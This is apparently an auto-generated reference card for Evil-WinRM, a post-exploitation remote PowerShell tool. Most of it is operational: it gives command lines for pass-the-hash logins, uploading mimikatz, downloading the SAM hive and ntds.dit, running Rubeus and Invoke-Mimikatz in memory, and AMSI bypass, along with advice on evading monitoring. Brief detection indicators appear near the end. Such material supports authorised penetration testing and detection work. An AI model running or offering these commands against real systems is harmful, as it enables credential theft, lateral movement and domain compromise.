---
name: Evil Winrm
description: WinRM client for remote PowerShell sessions on Windows using
  credentials, NTLM hashes, or certificates; supports file transfer and
  in-memory execution.
registry: registry
tool_id: evil-winrm
category: post-exploitation
tags:
  - winrm
  - post-exploitation
  - lateral-movement
  - remote-shell
  - windows
  - pass-the-hash
  - powershell
mitre_techniques:
  - T1021.006
  - T1550.002
  - T1059.001
summary: "Evil-WinRM establishes remote PowerShell sessions over WinRM (ports
  5985/HTTP, 5986/HTTPS). Invoke with -i <IP> and one of: -u/-p (password), -H
  (NTLM hash), or --priv-key-pem/--cert-pem (certificate). Use --ssl for port
  5986. Inside the shell: 'upload <local> <remote>' and 'download <remote>
  <local>' for file ops; 'Invoke-Binary <path>' runs EXE in-memory;
  'Bypass-4MSI' attempts AMSI bypass; 'Dll-Loader' or 'loaddll' loads .NET DLLs
  via reflection; 'services' lists services; 'menu' shows commands. Pass -s
  <dir> for PowerShell scripts, -e <dir> for executables. Use 'runps
  <script.ps1>' to execute local PS scripts remotely. Ctrl+C cancels commands,
  'exit' or Ctrl+D quits. Requires valid credentials or compromised hashes;
  target must have WinRM enabled and user must be in Remote Management Users or
  Administrators. Logs interactive commands to event 4103 (PowerShell module
  logging). For Pass-the-Hash, use -H with NTLM hash only (no LM). For domain
  users, prefix username with 'DOMAIN\\user' or use -d flag. Custom URIs with
  --uri if non-standard. Does not support Kerberos in all variants; check
  version. File transfers are in-memory by default for executables. Detection:
  look for wsmprovhost.exe spawning unusual PowerShell, UserAgent 'Microsoft
  WinRM Client', and PowerShell event 4103 with Invoke-Expression + Out-String
  patterns."
sources:
  - https://www.kali.org/tools/evil-winrm-py/
  - https://github.com/adityatelange/evil-winrm-py/blob/main/docs/usage.md
  - https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
  - https://hackviser.com/tactics/pentesting/services/winrm
  - https://www.youtube.com/watch?v=Ku5FSpqN31c
  - https://github.com/Ilias1988/Hacking-Cheatsheets/blob/main/Evil-WinRM/README.md
  - https://www.kali.org/tools/evil-winrm/
  - https://medium.com/@cY83rR0H1t/evil-winrm-detection-de2874af7eb0
  - https://cyberwarfare.live/a-unified-purple-teaming-approach-on-winrm-investigation-and-detection/
  - https://raxis.com/blog/ad-series-using-evil-winrm-to-get-ntds-manually/
  - https://www.hackingarticles.in/winrm-penetration-testing/
generated_at: 2026-05-19T11:09:03.417Z
generated_by: anthropic
source_hash: 40c7f5c724994e39662b863fde5d6307f3d43c834ad78b62b22269c2f835120a
---

# Evil Winrm

## Overview

Evil-WinRM is a post-exploitation tool that leverages Windows Remote Management (WinRM) to establish interactive PowerShell sessions on remote Windows hosts. It implements the WS-Management protocol and supports multiple authentication methods including plaintext passwords, NTLM Pass-the-Hash, and certificate-based authentication. The tool provides built-in file transfer, in-memory binary execution, DLL loading, and AMSI bypass capabilities, making it a comprehensive remote administration and exploitation platform for red team operations.

## When to use

Use Evil-WinRM after obtaining valid credentials or NTLM hashes during lateral movement. Prerequisites: WinRM service enabled on target (ports 5985 or 5986 open), valid credentials for a user in Remote Management Users group or Administrators, and network connectivity to the target. Ideal for: maintaining persistent access via legitimate Windows management protocols, executing commands without dropping files to disk, uploading/downloading files, running PowerShell scripts remotely, loading C# assemblies or DLLs in-memory, and bypassing endpoint detection when interactive RDP/SSH is unavailable or monitored. Do not use if WinRM is disabled, credentials are invalid, or you need Kerberos-only authentication (support varies by version).

## Authentication & setup

Basic password authentication: evil-winrm -i <IP> -u <username> -p '<password>'. For domain users: evil-winrm -i <IP> -u 'DOMAIN\username' -p '<password>' or use -d flag for domain. Pass-the-Hash (PTH): evil-winrm -i <IP> -u <username> -H <NTHASH> (use NTLM hash only, no LM portion). Certificate authentication: evil-winrm -i <IP> -u <username> --priv-key-pem <key.pem> --cert-pem <cert.pem>. SSL/TLS connections (port 5986): add --ssl or -S flag. Custom port: -P <port> or --port <port>. Custom WinRM URI: --uri <path> (default /wsman). Specify local script directory: -s <scripts_path>; executable directory: -e <exes_path>. User-agent customization: --ua '<agent>' or -a (default 'Microsoft WinRM Client'). Enable session logging: --log or -l. Disable colors: --no-colors or -n. For Kerberos (limited support): -r <REALM> and configure /etc/krb5.conf; use --spn <prefix> (default HTTP).

## Key commands / parameters

Connection flags: -i/--ip (required), -u/--user, -p/--password, -H/--hash (NTLM), -P/--port (default 5985), -S/--ssl, --priv-key-pem, --cert-pem, --uri, -s/--scripts, -e/--executables. Interactive shell commands: 'upload <local_path> <remote_path>' (upload file to target), 'download <remote_path> <local_path>' (download from target), 'menu' (show available commands), 'services' (list running services), 'Bypass-4MSI' (attempt AMSI bypass), 'Invoke-Binary <path>' (execute binary from memory using -e directory), 'Dll-Loader <dll>' or 'loaddll <dll>' (load DLL via .NET reflection, adds functions to tab completion), 'runps <script.ps1>' (execute local PowerShell script on remote), 'exit' or Ctrl+D (quit shell), Ctrl+C (cancel running command). Note: Some commands like Invoke-Binary require pre-configuring -e directory; DLL loading uses reflection and may fail with native DLLs. Tab completion works for loaded commands and remote paths (disable with -N).

## Example workflows

Basic connection: evil-winrm -i 192.168.1.50 -u administrator -p 'P@ssw0rd'. Pass-the-Hash: evil-winrm -i 10.10.10.10 -u admin -H 'A9FDFA038C4B75EBC76DC855DD74F0DA'. SSL connection: evil-winrm -i target.local -u 'CORP\bob' -p 'Winter2024!' --ssl -P 5986. Upload mimikatz: upload /opt/mimikatz.exe C:\Windows\Temp\m.exe. Download SAM: download C:\Windows\System32\config\SAM /tmp/sam. Execute in-memory (after -e /opt/exes): Invoke-Binary /opt/exes/Rubeus.exe. Load PowerShell script: evil-winrm -i 10.0.0.5 -u admin -p 'pass' -s /opt/ps-scripts, then inside shell use tab completion for loaded scripts. Run local script remotely: runps /root/Invoke-Mimikatz.ps1. Bypass AMSI and load DLL: Bypass-4MSI; loaddll /tmp/ADModule.dll. List services: services. Exfiltrate NTDS.dit (with domain admin): download C:\Windows\NTDS\ntds.dit /tmp/ntds.dit; download SYSTEM and SECURITY hives for bootkey, or use secretsdump with --bootkey flag after extracting bootkey from Evil-WinRM session output.

## Output format

Evil-WinRM provides an interactive PowerShell prompt styled as 'PS C:\Users\<user>\Documents>'. Command output appears as standard PowerShell text. File transfer commands ('upload', 'download') show progress and confirmation messages. 'menu' displays available built-in commands. 'services' outputs service name, display name, and status in tabular format. Errors appear inline (e.g., authentication failures, network issues, command execution errors). Session activity can be logged to file with --log flag. In-memory execution (Invoke-Binary) shows binary output directly. DLL loading adds new cmdlets/functions that appear in tab completion. No structured JSON or XML output; parse text as needed. Remote PowerShell errors and warnings display with standard PS formatting. AMSI bypass attempts show success/failure messages. For OPSEC: commands generate Windows event logs (4103 for PowerShell module logging, 4104 for script block logging if enabled, and WinRM operational logs).

## Common pitfalls

WinRM not enabled: target must have WinRM configured; test with nmap -p 5985,5986 or crackmapexec winrm. Insufficient privileges: user must be in Remote Management Users or Administrators; standard domain users often lack access. Firewall blocking: ports 5985/5986 must be reachable; check with nmap or nc. Hash format: use NTLM hash only for -H, not full LM:NTLM format; extract NTLM portion after colon. SSL certificate errors: with --ssl, self-signed certs may cause issues; Evil-WinRM typically ignores validation but check version. Domain syntax: use 'DOMAIN\user' format or set -d flag; test both. AMSI/AV interference: Bypass-4MSI may fail against updated Windows Defender; consider alternative bypasses or obfuscation. DLL loading limitations: Dll-Loader uses .NET reflection; native/unmanaged DLLs fail; only works with .NET assemblies. Path escaping: remote Windows paths need proper escaping in upload/download; use double backslashes or raw strings. Event log noise: WinRM sessions generate significant logs (event 4103, 4104, 5985, 5986); expect blue team detection if PowerShell logging enabled. Connection timeout: slow networks or overloaded targets may hang; no built-in timeout flag in older versions. Kerberos issues: limited Kerberos support; prefer NTLM or certificates. Binary execution requires -e directory: Invoke-Binary only works with pre-specified executables directory.

## References

- https://www.kali.org/tools/evil-winrm/
- https://www.kali.org/tools/evil-winrm-py/
- https://github.com/adityatelange/evil-winrm-py/blob/main/docs/usage.md
- https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
- https://hackviser.com/tactics/pentesting/services/winrm
- https://github.com/Ilias1988/Hacking-Cheatsheets/blob/main/Evil-WinRM/README.md
- https://www.hackingarticles.in/winrm-penetration-testing/
- https://raxis.com/blog/ad-series-using-evil-winrm-to-get-ntds-manually/
- https://cyberwarfare.live/a-unified-purple-teaming-approach-on-winrm-investigation-and-detection/
- https://medium.com/@cY83rR0H1t/evil-winrm-detection-de2874af7eb0
